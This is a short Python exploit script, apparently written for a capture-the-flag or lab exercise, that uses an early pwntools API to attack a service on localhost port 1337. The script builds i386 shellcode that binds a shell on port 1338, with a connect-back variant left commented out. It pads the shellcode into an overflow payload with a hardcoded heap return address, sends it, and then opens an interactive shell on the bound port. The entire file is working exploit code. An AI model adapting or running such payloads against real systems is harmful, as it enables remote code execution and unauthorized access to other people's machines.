#!/usr/bin/env python

from pwn import *
from pwn.i386.linux import *

sock = Remote('localhost', 1337)

heap_buffer = p(0x0804a080)

shellcode = assemble(
    listen(1338),
    'xchg eax, ebx',
    dup(),
    sh()
    )

# shellcode = assemble(
#     connect('localhost', 1338),
#     'xchg esi, ebx',
#     dup(),
#     sh()
#     )

payload = shellcode + 'A' * (0xd4 - len(shellcode)) + heap_buffer + '\n'
sock.send(payload)
sock.close()

sock = Remote('localhost', 1338)
sock.interactive()

print 'back from interactive'
